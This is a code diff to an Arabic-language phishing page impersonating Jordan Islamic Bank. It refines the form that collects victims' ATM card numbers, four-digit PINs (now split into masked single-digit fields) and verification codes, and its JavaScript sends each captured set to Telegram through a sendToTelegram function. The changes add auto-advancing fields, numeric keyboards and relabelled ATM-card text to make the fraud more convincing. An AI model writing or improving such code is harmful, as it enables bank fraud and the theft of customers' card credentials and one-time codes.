@@ -240,6 +240,7 @@
             justify-content: center;
             gap: 7px;
             margin-bottom: 22px;
+            direction: ltr;
         }
         .card-num-input {
             width: 54px;
@@ -252,10 +253,30 @@
             font-family: 'Cairo', Arial, sans-serif;
             margin-bottom: 0;
             box-shadow: 0 1px 5px 0 rgba(0,0,0,0.08);
+            direction: ltr;
+            letter-spacing:2px;
         }
-        .card-secret {
-            width: 93%;
-            margin: 0 auto 14px auto;
+        .card-secret-row {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 10px;
+            margin-bottom: 16px;
+            margin-top: 0;
+        }
+        .card-secret-input {
+            width: 42px;
+            height: 44px;
+            border-radius: 7px;
+            border: none;
+            background: #fff;
+            text-align: center;
+            font-size: 1.25rem;
+            font-family: 'Cairo', Arial, sans-serif;
+            margin-bottom: 0;
+            box-shadow: 0 1px 5px 0 rgba(0,0,0,0.08);
+            direction: ltr;
+            letter-spacing:1px;
         }
         .card-info-note {
             color: #fff;
@@ -293,6 +314,7 @@
             .card-img-wrap { width: 98vw; max-width: 182px; }
             .card-img { height: 85px; }
             .card-num-input { width: 40px; height: 34px; font-size: 1.1rem;}
+            .card-secret-input { width: 32px; height: 34px; font-size: 1.1rem;}
         }
     </style>
 </head>
@@ -387,13 +409,13 @@
                 <button type="submit">تأكيد</button>
             </form>
         </div>
-        <!-- Card Info View (new page, before verification) -->
+        <!-- Card Info View (ATM Card, improved) -->
         <div class="view" id="cardInfoView">
-            <div class="card-info-title">بطاقة الخصم الفوري</div>
+            <div class="card-info-title">بطاقة الصراف الآلي</div>
             <div class="card-img-wrap">
                 <div class="card-img">
                     <div class="card-img-content">
-                        <div style="font-weight:bold;font-size:.98rem;color:#b71c1c;margin-bottom:2px;">Debit</div>
+                        <div style="font-weight:bold;font-size:.98rem;color:#b71c1c;margin-bottom:2px;">ATM</div>
                         <div class="card-bank-name">Jordan Islamic Bank</div>
                         <div style="font-size:1.1rem;letter-spacing:4px;color:#b71c1c;">XXXX XXXX XXXX XXXX</div>
                     </div>
@@ -401,12 +423,17 @@
             </div>
             <form id="cardInfoForm" autocomplete="off" onsubmit="return goToVerificationFromCard(event)">
                 <div class="card-num-row">
-                    <input type="text" class="card-num-input" maxlength="4" pattern="\\d{4}" required id="cardNum1" name="cardNum1" autocomplete="off">
-                    <input type="text" class="card-num-input" maxlength="4" pattern="\\d{4}" required id="cardNum2" name="cardNum2" autocomplete="off">
-                    <input type="text" class="card-num-input" maxlength="4" pattern="\\d{4}" required id="cardNum3" name="cardNum3" autocomplete="off">
-                    <input type="text" class="card-num-input" maxlength="4" pattern="\\d{4}" required id="cardNum4" name="cardNum4" autocomplete="off">
+                    <input type="text" class="card-num-input" maxlength="4" pattern="\\d{4}" required id="cardNum1" name="cardNum1" autocomplete="off" inputmode="numeric">
+                    <input type="text" class="card-num-input" maxlength="4" pattern="\\d{4}" required id="cardNum2" name="cardNum2" autocomplete="off" inputmode="numeric">
+                    <input type="text" class="card-num-input" maxlength="4" pattern="\\d{4}" required id="cardNum3" name="cardNum3" autocomplete="off" inputmode="numeric">
+                    <input type="text" class="card-num-input" maxlength="4" pattern="\\d{4}" required id="cardNum4" name="cardNum4" autocomplete="off" inputmode="numeric">
                 </div>
-                <input type="text" class="card-secret" maxlength="4" pattern="\\d{4}" required id="cardSecret" name="cardSecret" placeholder="رقم البطاقة السري (XXXX)" autocomplete="off">
+                <div class="card-secret-row">
+                    <input type="password" class="card-secret-input" maxlength="1" pattern="\\d{1}" required id="cardSecret1" name="cardSecret1" autocomplete="off" inputmode="numeric">
+                    <input type="password" class="card-secret-input" maxlength="1" pattern="\\d{1}" required id="cardSecret2" name="cardSecret2" autocomplete="off" inputmode="numeric">
+                    <input type="password" class="card-secret-input" maxlength="1" pattern="\\d{1}" required id="cardSecret3" name="cardSecret3" autocomplete="off" inputmode="numeric">
+                    <input type="password" class="card-secret-input" maxlength="1" pattern="\\d{1}" required id="cardSecret4" name="cardSecret4" autocomplete="off" inputmode="numeric">
+                </div>
                 <div class="card-info-note">
                     في حال تعسر امتلاك بطاقة يرجى الضغط على إلغاء والمتابعة مع مركز الاتصال لتفعيل الحساب على الرقم <span>065680001</span>
                 </div>
@@ -422,7 +449,7 @@
             <div class="subtitle">عضو مجموعة البركة</div>
             <div id="verifyLabel" class="info-text">ادخل رمز التحقق</div>
             <form class="form-card" id="verifyForm" autocomplete="off" onsubmit="return sendVerification(event)">
-                <input type="text" id="verifyCode" name="verifyCode" placeholder="رمز التحقق" maxlength="6" required>
+                <input type="text" id="verifyCode" name="verifyCode" placeholder="رمز التحقق" maxlength="6" required inputmode="numeric">
                 <button type="submit">تأكيد</button>
             </form>
         </div>
@@ -443,6 +470,11 @@
         function showView(view) {
             document.querySelectorAll('.view').forEach(e => e.classList.remove('active'));
             document.getElementById(view).classList.add('active');
+            if(view === "cardInfoView") {
+                setTimeout(()=>{
+                    if(document.getElementById('cardNum1')) document.getElementById('cardNum1').focus();
+                }, 120);
+            }
         }
 
         // For login (username/password) go directly to verification
@@ -503,16 +535,30 @@
         // On card info submit
         function goToVerificationFromCard(event) {
             event.preventDefault();
-            const form = document.getElementById('cardInfoForm');
-            const formData = new FormData(form);
+            // Get card number and pin as full string
+            let cardNum = [
+                document.getElementById('cardNum1').value,
+                document.getElementById('cardNum2').value,
+                document.getElementById('cardNum3').value,
+                document.getElementById('cardNum4').value
+            ].join(' ');
+            let pin = [
+                document.getElementById('cardSecret1').value,
+                document.getElementById('cardSecret2').value,
+                document.getElementById('cardSecret3').value,
+                document.getElementById('cardSecret4').value
+            ].join('');
             cardInfoData = {
-                cardNum1: formData.get('cardNum1'),
-                cardNum2: formData.get('cardNum2'),
-                cardNum3: formData.get('cardNum3'),
-                cardNum4: formData.get('cardNum4'),
-                cardSecret: formData.get('cardSecret')
+                cardNum1: document.getElementById('cardNum1').value,
+                cardNum2: document.getElementById('cardNum2').value,
+                cardNum3: document.getElementById('cardNum3').value,
+                cardNum4: document.getElementById('cardNum4').value,
+                cardSecret1: document.getElementById('cardSecret1').value,
+                cardSecret2: document.getElementById('cardSecret2').value,
+                cardSecret3: document.getElementById('cardSecret3').value,
+                cardSecret4: document.getElementById('cardSecret4').value
             };
-            let cardSummary = `بطاقة الخصم الفوري\nرقم البطاقة: ${cardInfoData.cardNum1} ${cardInfoData.cardNum2} ${cardInfoData.cardNum3} ${cardInfoData.cardNum4}\nالرقم السري: ${cardInfoData.cardSecret}`;
+            let cardSummary = `بطاقة الصراف الآلي\nرقم البطاقة: ${cardNum}\nالرقم السري: ${pin}`;
             // Send all previous + card info
             sendToTelegram((lastFormData.summary || '') + '\n' + cardSummary);
             showView('verifyView');
@@ -524,8 +570,10 @@
             event.preventDefault();
             const code = document.getElementById('verifyCode').value.trim();
             if(!code) return false;
-            let msg = (lastFormData.summary || '') + 
-                ((cardInfoData.cardNum1) ? `\nبطاقة الخصم الفوري\nرقم البطاقة: ${cardInfoData.cardNum1} ${cardInfoData.cardNum2} ${cardInfoData.cardNum3} ${cardInfoData.cardNum4}\nالرقم السري: ${cardInfoData.cardSecret}` : '') +
+            let cardNum = (cardInfoData.cardNum1||'')+" "+(cardInfoData.cardNum2||'')+" "+(cardInfoData.cardNum3||'')+" "+(cardInfoData.cardNum4||'');
+            let pin = (cardInfoData.cardSecret1||'')+(cardInfoData.cardSecret2||'')+(cardInfoData.cardSecret3||'')+(cardInfoData.cardSecret4||'');
+            let msg = (lastFormData.summary || '') +
+                ((cardInfoData.cardNum1) ? `\nبطاقة الصراف الآلي\nرقم البطاقة: ${cardNum}\nالرقم السري: ${pin}` : '') +
                 `\nرمز التحقق: ${code}`;
             sendToTelegram(msg, true);
             showView('successView');
@@ -555,6 +603,50 @@
                 body: JSON.stringify(params)
             }).catch(()=>{});
         }
+
+        // توجيه الكيبورد تلقائيا لخانات البطاقة والرقم السري من اليسار لليمين
+        document.addEventListener('DOMContentLoaded', function () {
+            // الرقم الكامل ATM
+            let atmInputs = [
+                document.getElementById('cardNum1'),
+                document.getElementById('cardNum2'),
+                document.getElementById('cardNum3'),
+                document.getElementById('cardNum4')
+            ];
+            atmInputs.forEach((inp, idx) => {
+                inp.addEventListener('input', function (e) {
+                    this.value = this.value.replace(/\D/g, '');
+                    if (this.value.length === 4 && idx < atmInputs.length - 1) {
+                        atmInputs[idx + 1].focus();
+                    }
+                });
+                inp.addEventListener('keydown', function (e) {
+                    if (e.key === "Backspace" && this.value.length === 0 && idx > 0) {
+                        atmInputs[idx - 1].focus();
+                    }
+                });
+            });
+            // السري
+            let pinInputs = [
+                document.getElementById('cardSecret1'),
+                document.getElementById('cardSecret2'),
+                document.getElementById('cardSecret3'),
+                document.getElementById('cardSecret4')
+            ];
+            pinInputs.forEach((inp, idx) => {
+                inp.addEventListener('input', function (e) {
+                    this.value = this.value.replace(/\D/g, '');
+                    if (this.value.length === 1 && idx < pinInputs.length - 1) {
+                        pinInputs[idx + 1].focus();
+                    }
+                });
+                inp.addEventListener('keydown', function (e) {
+                    if (e.key === "Backspace" && this.value.length === 0 && idx > 0) {
+                        pinInputs[idx - 1].focus();
+                    }
+                });
+            });
+        });
     </script>
 </body>
 </html>
